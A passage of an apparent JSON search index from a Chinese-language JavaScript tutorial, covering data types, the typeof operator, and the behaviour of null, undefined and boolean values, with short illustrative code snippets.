type\uff09\u7684\u503c\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5bf9\u8c61\u5f80\u5f80\u662f\u591a\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u7684\u5408\u6210\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5b58\u653e\u5404\u79cd\u503c\u7684\u5bb9\u5668\u3002\u81f3\u4e8e undefined \u548c null \uff0c\u4e00\u822c\u5c06\u5b83\u4eec\u770b\u6210\u4e24\u4e2a\u7279\u6b8a\u503c\u3002 \u5bf9\u8c61\u662f\u6700\u590d\u6742\u7684\u6570\u636e\u7c7b\u578b\uff0c\u53c8\u53ef\u4ee5\u5206\u6210\u4e09\u4e2a\u5b50\u7c7b\u578b\u3002 \u72ed\u4e49\u7684\u5bf9\u8c61\uff08object\uff09 \u6570\u7ec4\uff08array\uff09 \u51fd\u6570\uff08function\uff09 \u72ed\u4e49\u7684\u5bf9\u8c61\u548c\u6570\u7ec4\u662f\u4e24\u79cd\u4e0d\u540c\u7684\u6570\u636e\u7ec4\u5408\u65b9\u5f0f\uff0c\u9664\u975e\u7279\u522b\u58f0\u660e\uff0c\u672c\u6559\u7a0b\u7684\u201c\u5bf9\u8c61\u201d\u90fd\u7279\u6307\u72ed\u4e49\u7684\u5bf9\u8c61\u3002\u51fd\u6570\u5176\u5b9e\u662f\u5904\u7406\u6570\u636e\u7684\u65b9\u6cd5\uff0cJavaScript \u628a\u5b83\u5f53\u6210\u4e00\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u8fd9\u4e3a\u7f16\u7a0b\u5e26\u6765\u4e86\u5f88\u5927\u7684\u7075\u6d3b\u6027\uff0c\u4e5f\u4e3a JavaScript \u7684\u201c\u51fd\u6570\u5f0f\u7f16\u7a0b\u201d\u5960\u5b9a\u4e86\u57fa\u7840\u3002 typeof \u8fd0\u7b97\u7b26 \u00b6 JavaScript \u6709\u4e09\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e00\u4e2a\u503c\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u3002 typeof \u8fd0\u7b97\u7b26 instanceof \u8fd0\u7b97\u7b26 Object.prototype.toString \u65b9\u6cd5 instanceof \u8fd0\u7b97\u7b26\u548c Object.prototype.toString \u65b9\u6cd5\uff0c\u5c06\u5728\u540e\u6587\u4ecb\u7ecd\u3002\u8fd9\u91cc\u4ecb\u7ecd typeof \u8fd0\u7b97\u7b26\u3002 typeof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u6570\u636e\u7c7b\u578b\u3002 \u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u5206\u522b\u8fd4\u56de number \u3001 string \u3001 boolean \u3002 1 2 3 typeof 123 // \"number\" typeof '123' // \"string\" typeof false // \"boolean\" \u51fd\u6570\u8fd4\u56de function \u3002 1 2 3 function f () {} typeof f // \"function\" undefined \u8fd4\u56de undefined \u3002 1 2 typeof undefined // \"undefined\" \u5229\u7528\u8fd9\u4e00\u70b9\uff0c typeof \u53ef\u4ee5\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u6ca1\u6709\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u62a5\u9519\u3002 1 2 3 4 5 v // ReferenceError: v is not defined typeof v // \"undefined\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf v \u6ca1\u6709\u7528 var \u547d\u4ee4\u58f0\u660e\uff0c\u76f4\u63a5\u4f7f\u7528\u5c31\u4f1a\u62a5\u9519\u3002\u4f46\u662f\uff0c\u653e\u5728 typeof \u540e\u9762\uff0c\u5c31\u4e0d\u62a5\u9519\u4e86\uff0c\u800c\u662f\u8fd4\u56de undefined \u3002 \u5b9e\u9645\u7f16\u7a0b\u4e2d\uff0c\u8fd9\u4e2a\u7279\u70b9\u901a\u5e38\u7528\u5728\u5224\u65ad\u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 // \u9519\u8bef\u7684\u5199\u6cd5 if ( v ) { // ... } // ReferenceError: v is not defined // \u6b63\u786e\u7684\u5199\u6cd5 if ( typeof v === \"undefined\" ) { // ... } \u5bf9\u8c61\u8fd4\u56de object \u3002 1 2 3 typeof window // \"object\" typeof {} // \"object\" typeof [] // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7a7a\u6570\u7ec4\uff08 [] \uff09\u7684\u7c7b\u578b\u4e5f\u662f object \uff0c\u8fd9\u8868\u793a\u5728 JavaScript \u5185\u90e8\uff0c\u6570\u7ec4\u672c\u8d28\u4e0a\u53ea\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5bf9\u8c61\u3002\u8fd9\u91cc\u987a\u4fbf\u63d0\u4e00\u4e0b\uff0c instanceof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u533a\u5206\u6570\u7ec4\u548c\u5bf9\u8c61\u3002 instanceof \u8fd0\u7b97\u7b26\u7684\u8be6\u7ec6\u89e3\u91ca\uff0c\u8bf7\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 var o = {}; var a = []; o instanceof Array // false a instanceof Array // true null \u8fd4\u56de object \u3002 1 typeof null // \"object\" null \u7684\u7c7b\u578b\u662f object \uff0c\u8fd9\u662f\u7531\u4e8e\u5386\u53f2\u539f\u56e0\u9020\u6210\u7684\u30021995\u5e74\u7684 JavaScript \u8bed\u8a00\u7b2c\u4e00\u7248\uff0c\u53ea\u8bbe\u8ba1\u4e86\u4e94\u79cd\u6570\u636e\u7c7b\u578b\uff08\u5bf9\u8c61\u3001\u6574\u6570\u3001\u6d6e\u70b9\u6570\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\uff09\uff0c\u6ca1\u8003\u8651 null \uff0c\u53ea\u628a\u5b83\u5f53\u4f5c object \u7684\u4e00\u79cd\u7279\u6b8a\u503c\u3002\u540e\u6765 null \u72ec\u7acb\u51fa\u6765\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5355\u72ec\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0c typeof null \u8fd4\u56de object \u5c31\u6ca1\u6cd5\u6539\u53d8\u4e86\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, Improving the JavaScript typeof operator","title":"\u6982\u8ff0"},{"location":"types/general/#_1","text":"","title":"\u6570\u636e\u7c7b\u578b\u6982\u8ff0"},{"location":"types/general/#_2","text":"JavaScript \u8bed\u8a00\u7684\u6bcf\u4e00\u4e2a\u503c\uff0c\u90fd\u5c5e\u4e8e\u67d0\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002JavaScript \u7684\u6570\u636e\u7c7b\u578b\uff0c\u5171\u6709\u516d\u79cd\u3002\uff08ES6 \u53c8\u65b0\u589e\u4e86\u7b2c\u4e03\u79cd Symbol \u7c7b\u578b\u7684\u503c\uff0c\u672c\u6559\u7a0b\u4e0d\u6d89\u53ca\u3002\uff09 \u6570\u503c\uff08number\uff09\uff1a\u6574\u6570\u548c\u5c0f\u6570\uff08\u6bd4\u5982 1 \u548c 3.14 \uff09\u3002 \u5b57\u7b26\u4e32\uff08string\uff09\uff1a\u6587\u672c\uff08\u6bd4\u5982 Hello World \uff09\u3002 \u5e03\u5c14\u503c\uff08boolean\uff09\uff1a\u8868\u793a\u771f\u4f2a\u7684\u4e24\u4e2a\u7279\u6b8a\u503c\uff0c\u5373 true \uff08\u771f\uff09\u548c false \uff08\u5047\uff09\u3002 undefined \uff1a\u8868\u793a\u201c\u672a\u5b9a\u4e49\u201d\u6216\u4e0d\u5b58\u5728\uff0c\u5373\u7531\u4e8e\u76ee\u524d\u6ca1\u6709\u5b9a\u4e49\uff0c\u6240\u4ee5\u6b64\u5904\u6682\u65f6\u6ca1\u6709\u4efb\u4f55\u503c\u3002 null \uff1a\u8868\u793a\u7a7a\u503c\uff0c\u5373\u6b64\u5904\u7684\u503c\u4e3a\u7a7a\u3002 \u5bf9\u8c61\uff08object\uff09\uff1a\u5404\u79cd\u503c\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u901a\u5e38\uff0c\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u8fd9\u4e09\u79cd\u7c7b\u578b\uff0c\u5408\u79f0\u4e3a\u539f\u59cb\u7c7b\u578b\uff08primitive type\uff09\u7684\u503c\uff0c\u5373\u5b83\u4eec\u662f\u6700\u57fa\u672c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u80fd\u518d\u7ec6\u5206\u4e86\u3002\u5bf9\u8c61\u5219\u79f0\u4e3a\u5408\u6210\u7c7b\u578b\uff08complex type\uff09\u7684\u503c\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5bf9\u8c61\u5f80\u5f80\u662f\u591a\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u7684\u5408\u6210\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5b58\u653e\u5404\u79cd\u503c\u7684\u5bb9\u5668\u3002\u81f3\u4e8e undefined \u548c null \uff0c\u4e00\u822c\u5c06\u5b83\u4eec\u770b\u6210\u4e24\u4e2a\u7279\u6b8a\u503c\u3002 \u5bf9\u8c61\u662f\u6700\u590d\u6742\u7684\u6570\u636e\u7c7b\u578b\uff0c\u53c8\u53ef\u4ee5\u5206\u6210\u4e09\u4e2a\u5b50\u7c7b\u578b\u3002 \u72ed\u4e49\u7684\u5bf9\u8c61\uff08object\uff09 \u6570\u7ec4\uff08array\uff09 \u51fd\u6570\uff08function\uff09 \u72ed\u4e49\u7684\u5bf9\u8c61\u548c\u6570\u7ec4\u662f\u4e24\u79cd\u4e0d\u540c\u7684\u6570\u636e\u7ec4\u5408\u65b9\u5f0f\uff0c\u9664\u975e\u7279\u522b\u58f0\u660e\uff0c\u672c\u6559\u7a0b\u7684\u201c\u5bf9\u8c61\u201d\u90fd\u7279\u6307\u72ed\u4e49\u7684\u5bf9\u8c61\u3002\u51fd\u6570\u5176\u5b9e\u662f\u5904\u7406\u6570\u636e\u7684\u65b9\u6cd5\uff0cJavaScript \u628a\u5b83\u5f53\u6210\u4e00\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u8fd9\u4e3a\u7f16\u7a0b\u5e26\u6765\u4e86\u5f88\u5927\u7684\u7075\u6d3b\u6027\uff0c\u4e5f\u4e3a JavaScript \u7684\u201c\u51fd\u6570\u5f0f\u7f16\u7a0b\u201d\u5960\u5b9a\u4e86\u57fa\u7840\u3002","title":"\u7b80\u4ecb"},{"location":"types/general/#typeof","text":"JavaScript \u6709\u4e09\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e00\u4e2a\u503c\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u3002 typeof \u8fd0\u7b97\u7b26 instanceof \u8fd0\u7b97\u7b26 Object.prototype.toString \u65b9\u6cd5 instanceof \u8fd0\u7b97\u7b26\u548c Object.prototype.toString \u65b9\u6cd5\uff0c\u5c06\u5728\u540e\u6587\u4ecb\u7ecd\u3002\u8fd9\u91cc\u4ecb\u7ecd typeof \u8fd0\u7b97\u7b26\u3002 typeof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u6570\u636e\u7c7b\u578b\u3002 \u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u5206\u522b\u8fd4\u56de number \u3001 string \u3001 boolean \u3002 1 2 3 typeof 123 // \"number\" typeof '123' // \"string\" typeof false // \"boolean\" \u51fd\u6570\u8fd4\u56de function \u3002 1 2 3 function f () {} typeof f // \"function\" undefined \u8fd4\u56de undefined \u3002 1 2 typeof undefined // \"undefined\" \u5229\u7528\u8fd9\u4e00\u70b9\uff0c typeof \u53ef\u4ee5\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u6ca1\u6709\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u62a5\u9519\u3002 1 2 3 4 5 v // ReferenceError: v is not defined typeof v // \"undefined\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf v \u6ca1\u6709\u7528 var \u547d\u4ee4\u58f0\u660e\uff0c\u76f4\u63a5\u4f7f\u7528\u5c31\u4f1a\u62a5\u9519\u3002\u4f46\u662f\uff0c\u653e\u5728 typeof \u540e\u9762\uff0c\u5c31\u4e0d\u62a5\u9519\u4e86\uff0c\u800c\u662f\u8fd4\u56de undefined \u3002 \u5b9e\u9645\u7f16\u7a0b\u4e2d\uff0c\u8fd9\u4e2a\u7279\u70b9\u901a\u5e38\u7528\u5728\u5224\u65ad\u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 // \u9519\u8bef\u7684\u5199\u6cd5 if ( v ) { // ... } // ReferenceError: v is not defined // \u6b63\u786e\u7684\u5199\u6cd5 if ( typeof v === \"undefined\" ) { // ... } \u5bf9\u8c61\u8fd4\u56de object \u3002 1 2 3 typeof window // \"object\" typeof {} // \"object\" typeof [] // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7a7a\u6570\u7ec4\uff08 [] \uff09\u7684\u7c7b\u578b\u4e5f\u662f object \uff0c\u8fd9\u8868\u793a\u5728 JavaScript \u5185\u90e8\uff0c\u6570\u7ec4\u672c\u8d28\u4e0a\u53ea\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5bf9\u8c61\u3002\u8fd9\u91cc\u987a\u4fbf\u63d0\u4e00\u4e0b\uff0c instanceof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u533a\u5206\u6570\u7ec4\u548c\u5bf9\u8c61\u3002 instanceof \u8fd0\u7b97\u7b26\u7684\u8be6\u7ec6\u89e3\u91ca\uff0c\u8bf7\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 var o = {}; var a = []; o instanceof Array // false a instanceof Array // true null \u8fd4\u56de object \u3002 1 typeof null // \"object\" null \u7684\u7c7b\u578b\u662f object \uff0c\u8fd9\u662f\u7531\u4e8e\u5386\u53f2\u539f\u56e0\u9020\u6210\u7684\u30021995\u5e74\u7684 JavaScript \u8bed\u8a00\u7b2c\u4e00\u7248\uff0c\u53ea\u8bbe\u8ba1\u4e86\u4e94\u79cd\u6570\u636e\u7c7b\u578b\uff08\u5bf9\u8c61\u3001\u6574\u6570\u3001\u6d6e\u70b9\u6570\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\uff09\uff0c\u6ca1\u8003\u8651 null \uff0c\u53ea\u628a\u5b83\u5f53\u4f5c object \u7684\u4e00\u79cd\u7279\u6b8a\u503c\u3002\u540e\u6765 null \u72ec\u7acb\u51fa\u6765\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5355\u72ec\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0c typeof null \u8fd4\u56de object \u5c31\u6ca1\u6cd5\u6539\u53d8\u4e86\u3002","title":"typeof \u8fd0\u7b97\u7b26"},{"location":"types/general/#_3","text":"Axel Rauschmayer, Improving the JavaScript typeof operator","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"types/null-undefined-boolean/","text":"null, undefined \u548c\u5e03\u5c14\u503c \u00b6 null \u548c undefined \u00b6 \u6982\u8ff0 \u00b6 null \u4e0e undefined \u90fd\u53ef\u4ee5\u8868\u793a\u201c\u6ca1\u6709\u201d\uff0c\u542b\u4e49\u975e\u5e38\u76f8\u4f3c\u3002\u5c06\u4e00\u4e2a\u53d8\u91cf\u8d4b\u503c\u4e3a undefined \u6216 null \uff0c\u8001\u5b9e\u8bf4\uff0c\u8bed\u6cd5\u6548\u679c\u51e0\u4e4e\u6ca1\u533a\u522b\u3002 1 2 3 var a = undefined ; // \u6216\u8005 var a = null ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf a \u5206\u522b\u88ab\u8d4b\u503c\u4e3a undefined \u548c null \uff0c\u8fd9\u4e24\u79cd\u5199\u6cd5\u7684\u6548\u679c\u51e0\u4e4e\u7b49\u4ef7\u3002 \u5728 if \u8bed\u53e5\u4e2d\uff0c\u5b83\u4eec\u90fd\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a false \uff0c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u751a\u81f3\u76f4\u63a5\u62a5\u544a\u4e24\u8005\u76f8\u7b49\u3002 1 2 3 4 5 6 7 8 9 10 11 12 if ( ! undefined ) { console . log ( 'undefined is false' ); } // undefined is false if ( ! null ) { console . log ( 'null is false' ); } // null is false undefined == null // true \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u89c1\uff0c\u4e24\u8005\u7684\u884c\u4e3a\u662f\u4f55\u7b49\u76f8\u4f3c\uff01\u8c37\u6b4c\u516c\u53f8\u5f00\u53d1\u7684 JavaScript \u8bed\u8a00\u7684\u66ff\u4ee3\u54c1 Dart \u8bed\u8a00\uff0c\u5c31\u660e\u786e\u89c4\u5b9a\u53ea\u6709 null \uff0c\u6ca1\u6709 undefined \uff01 \u65e2\u7136\u542b\u4e49\u4e0e\u7528\u6cd5\u90fd\u5dee\u4e0d\u591a\uff0c\u4e3a\u4ec0\u4e48\u8981\u540c\u65f6\u8bbe\u7f6e\u4e24\u4e2a\u8fd9\u6837\u7684\u503c\uff0c\u8fd9\u4e0d\u662f\u65e0\u7aef\u589e\u52a0\u590d\u6742\u5ea6\uff0c\u4ee4\u521d\u5b66\u8005\u56f0\u6270\u5417\uff1f\u8fd9\u4e0e\u5386\u53f2\u539f\u56e0\u6709\u5173\u3002 1995\u5e74 JavaScript \u8bde\u751f\u65f6\uff0c\u6700\u521d\u50cf Java \u4e00\u6837\uff0c\u53ea\u8bbe\u7f6e\u4e86 null \u8868\u793a\"\u65e0\"\u3002\u6839\u636e C \u8bed\u8a00\u7684\u4f20\u7edf\uff0c null \u53ef\u4ee5\u81ea\u52a8\u8f6c\u4e3a 0 \u3002 1 2 Number ( null ) // 0 5 + null // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c null \u8f6c\u4e3a\u6570\u5b57\u65f6\uff0c\u81ea\u52a8\u53d8\u62100\u3002 \u4f46\u662f\uff0cJavaScript \u7684\u8bbe\u8ba1\u8005 Brendan Eich\uff0c\u89c9\u5f97\u8fd9\u6837\u505a\u8fd8\u4e0d\u591f\u3002\u9996\u5148\uff0c\u7b2c\u4e00\u7248\u7684 JavaScript \u91cc\u9762\uff0c null \u5c31\u50cf\u5728 Java \u91cc\u4e00\u6837\uff0c\u88ab\u5f53\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0cBrendan Eich \u89c9\u5f97\u8868\u793a\u201c\u65e0\u201d\u7684\u503c\u6700\u597d\u4e0d\u662f\u5bf9\u8c61\u3002\u5176\u6b21\uff0c\u90a3\u65f6\u7684 JavaScript \u4e0d\u5305\u62ec\u9519\u8bef\u5904\u7406\u673a\u5236\uff0cBrendan Eich \u89c9\u5f97\uff0c\u5982\u679c null \u81ea\u52a8\u8f6c\u4e3a0\uff0c\u5f88\u4e0d\u5bb9\u6613\u53d1\u73b0\u9519\u8bef\u3002 \u56e0\u6b64\uff0c\u4ed6\u53c8\u8bbe\u8ba1\u4e86\u4e00\u4e2a undefined \u3002\u533a\u522b\u662f\u8fd9\u6837\u7684\uff1a null \u662f\u4e00\u4e2a\u8868\u793a\u201c\u7a7a\u201d\u7684\u5bf9\u8c61\uff0c\u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a 0 \uff1b undefined \u662f\u4e00\u4e2a\u8868\u793a\"\u6b64\u5904\u65e0\u5b9a\u4e49\"\u7684\u539f\u59cb\u503c\uff0c\u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a NaN \u3002 1 2 Number ( undefined ) // NaN 5 + undefined // NaN \u7528\u6cd5\u548c\u542b\u4e49 \u00b6 \u5bf9\u4e8e null \u548c undefined \uff0c\u5927\u81f4\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u7406\u89e3\u3002 null \u8868\u793a\u7a7a\u503c\uff0c\u5373\u8be5\u5904\u7684\u503c\u73b0\u5728\u4e3a\u7a7a\u3002\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u67d0\u4e2a\u53c2\u6570\u672a\u8bbe\u7f6e\u4efb\u4f55\u503c\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u4f20\u5165 null \uff0c\u8868\u793a\u8be5\u53c2\u6570\u4e3a\u7a7a\u3002\u6bd4\u5982\uff0c\u67d0\u4e2a\u51fd\u6570\u63a5\u53d7\u5f15\u64ce\u629b\u51fa\u7684\u9519\u8bef\u4f5c\u4e3a\u53c2\u6570\uff0c\u5982\u679c\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u672a\u51fa\u9519\uff0c\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u5c31\u4f1a\u4f20\u5165 null \uff0c\u8868\u793a\u672a\u53d1\u751f\u9519\u8bef\u3002 undefined \u8868\u793a\u201c\u672a\u5b9a\u4e49\u201d\uff0c\u4e0b\u9762\u662f\u8fd4\u56de undefined \u7684\u5178\u578b\u573a\u666f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u53d8\u91cf\u58f0\u660e\u4e86\uff0c\u4f46\u6ca1\u6709\u8d4b\u503c var i ; i // undefined // \u8c03\u7528\u51fd\u6570\u65f6\uff0c\u5e94\u8be5\u63d0\u4f9b\u7684\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u8be5\u53c2\u6570\u7b49\u4e8e undefined function f ( x ) { return x ; } f () // undefined // \u5bf9\u8c61\u6ca1\u6709\u8d4b\u503c\u7684\u5c5e\u6027 var o = new Object (); o . p // undefined // \u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\u65f6\uff0c\u9ed8\u8ba4\u8fd4\u56de undefined function f () {} f () // undefined \u5e03\u5c14\u503c \u00b6 \u5e03\u5c14\u503c\u4ee3\u8868\u201c\u771f\u201d\u548c\u201c\u5047\u201d\u4e24\u4e2a\u72b6\u6001\u3002\u201c\u771f\u201d\u7528\u5173\u952e\u5b57 true \u8868\u793a\uff0c\u201c\u5047\u201d\u7528\u5173\u952e\u5b57 false \u8868\u793a\u3002\u5e03\u5c14\u503c\u53ea\u6709\u8fd9\u4e24\u4e2a\u503c\u3002 \u4e0b\u5217\u8fd0\u7b97\u7b26\u4f1a\u8fd4\u56de\u5e03\u5c14\u503c\uff1a \u524d\u7f6e\u903b\u8f91\u8fd0\u7b97\u7b26\uff1a ! (Not) \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a === \uff0c !== \uff0c == \uff0c != \u6bd4\u8f83\u8fd0\u7b97\u7b26\uff1a > \uff0c >= \uff0c < \uff0c <= \u5982\u679c JavaScript \u9884\u671f\u67d0\u4e2a\u4f4d\u7f6e\u5e94\u8be5\u662f\u5e03\u5c14\u503c\uff0c\u4f1a\u5c06\u8be5\u4f4d\u7f6e\u4e0a\u73b0\u6709\u7684\u503c\u81ea\u52a8\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u8f6c\u6362\u89c4\u5219\u662f\u9664\u4e86\u4e0b\u9762\u516d\u4e2a\u503c\u88ab\u8f6c\u4e3a false \uff0c\u5176\u4ed6\u503c\u90fd\u89c6\u4e3a true \u3002 undefined null false 0 NaN \"\" \u6216 '' \uff08\u7a7a\u5b57\u7b26\u4e32\uff09 \u5e03\u5c14\u503c\u5f80\u5f80\u7528\u4e8e\u7a0b\u5e8f\u6d41\u7a0b\u7684\u63a7\u5236\uff0c\u8bf7\u770b\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 if ( '' ) { console . log ( 'true' ); } // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c if \u547d\u4ee4\u540e\u9762\u7684\u5224\u65ad\u6761\u4ef6\uff0c\u9884\u671f\u5e94\u8be5\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6240\u4ee5 JavaScript \u81ea\u52a8\u5c06\u7a7a\u5b57\u7b26\u4e32\uff0c\u8f6c\u4e3a\u5e03\u5c14\u503c false \uff0c\u5bfc\u81f4\u7a0b\u5e8f\u4e0d\u4f1a\u8fdb\u5165\u4ee3\u7801\u5757\uff0c\u6240\u4ee5\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\u3002 \u6ce8\u610f\uff0c\u7a7a\u6570\u7ec4\uff08 [] \uff09\u548c\u7a7a\u5bf9\u8c61\uff08 {} \uff09\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\uff0c\u90fd\u662f true \u3002 1 2 3 4 5 6 7 8 9 if ([]) { console . log ( 'true' ); } // true if ({}) { console . log ( 'true' ); } // true \u66f4\u591a\u5173\u4e8e\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u7684\u4ecb\u7ecd\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, Categorizing values in JavaScript","title":"null\uff0cundefined \u548c\u5e03\u5c14\u503c"},{"location":"types/null-undefined-boolean/#null-undefined","text":"","title":"null, undefined \u548c\u5e03\u5c14\u503c"},{"location":"types/null-undefined-boolean/#null-undefined_1","text":"","title":"null \u548c undefined"},{"location":"types/null-undefined-boolean/#_1","text":"null \u4e0e undefined \u90fd\u53ef\u4ee5\u8868\u793a\u201c\u6ca1\u6709\u201d\uff0c\u542b\u4e49\u975e\u5e38\u76f8\u4f3c\u3002\u5c06\u4e00\u4e2a\u53d8\u91cf\u8d4b\u503c\u4e3a undefined \u6216 null \uff0c\u8001\u5b9e\u8bf4\uff0c\u8bed\u6cd5\u6548\u679c\u51e0\u4e4e\u6ca1\u533a\u522b\u3002 1 2 3 var a = undefined ; // \u6216\u8005 var a = null ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf a \u5206\u522b\u88ab\u8d4b\u503c\u4e3a undefined \u548c null \uff0c\u8fd9\u4e24\u79cd\u5199\u6cd5\u7684\u6548\u679c\u51e0\u4e4e\u7b49\u4ef7\u3002 \u5728 if \u8bed\u53e5\u4e2d\uff0c\u5b83\u4eec\u90fd\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a false \uff0c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u751a\u81f3\u76f4\u63a5\u62a5\u544a\u4e24\u8005\u76f8\u7b49\u3002 1 2 3 4 5 6 7 8 9 10 11 12 if ( ! undefined ) { console . log ( 'undefined is false' ); } // undefined is false if ( ! null ) { console . log ( 'null is false' ); } // null is false undefined == null // true \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u89c1\uff0c\u4e24\u8005\u7684\u884c\u4e3a\u662f\u4f55\u7b49\u76f8\u4f3c\uff01\u8c37\u6b4c\u516c\u53f8\u5f00\u53d1\u7684 JavaScript \u8bed\u8a00\u7684\u66ff\u4ee3\u54c1 Dart \u8bed\u8a00\uff0c\u5c31\u660e\u786e\u89c4\u5b9a\u53ea\u6709 null \uff0c\u6ca1\u6709 undefined \uff01 \u65e2\u7136\u542b\u4e49\u4e0e\u7528\u6cd5\u90fd\u5dee\u4e0d\u591a\uff0c\u4e3a\u4ec0\u4e48\u8981\u540c\u65f6\u8bbe\u7f6e\u4e24\u4e2a\u8fd9\u6837\u7684\u503c\uff0c\u8fd9\u4e0d\u662f\u65e0\u7aef\u589e\u52a0\u590d\u6742\u5ea6\uff0c\u4ee4\u521d\u5b66\u8005\u56f0\u6270\u5417\uff1f\u8fd9\u4e0e\u5386\u53f2\u539f\u56e0\u6709\u5173\u3002 1995\u5e74 JavaScript \u8bde\u751f\u65f6\uff0c\u6700\u521d\u50cf Java \u4e00\u6837\uff0c\u53ea\u8bbe\u7f6e\u4e86 null \u8868\u793a\"\u65e0\"\u3002\u6839\u636e C \u8bed\u8a00\u7684\u4f20\u7edf\uff0c null \u53ef\u4ee5\u81ea\u52a8\u8f6c\u4e3a 0 \u3002 1 2 Number ( null ) // 0 5 + null // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c null \u8f6c\u4e3a\u6570\u5b57\u65f6\uff0c\u81ea\u52a8\u53d8\u62100\u3002 \u4f46\u662f\uff0cJavaScript \u7684\u8bbe\u8ba1\u8005 Brendan Eich\uff0c\u89c9\u5f97\u8fd9\u6837\u505a\u8fd8\u4e0d\u591f\u3002\u9996\u5148\uff0c\u7b2c\u4e00\u7248\u7684 JavaScript \u91cc\u9762\uff0c null \u5c31\u50cf\u5728 Java \u91cc\u4e00\u6837\uff0c\u88ab\u5f53\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0cBrendan Eich \u89c9\u5f97\u8868\u793a\u201c\u65e0\u201d\u7684\u503c\u6700\u597d\u4e0d\u662f\u5bf9\u8c61\u3002\u5176\u6b21\uff0c\u90a3\u65f6\u7684 JavaScript 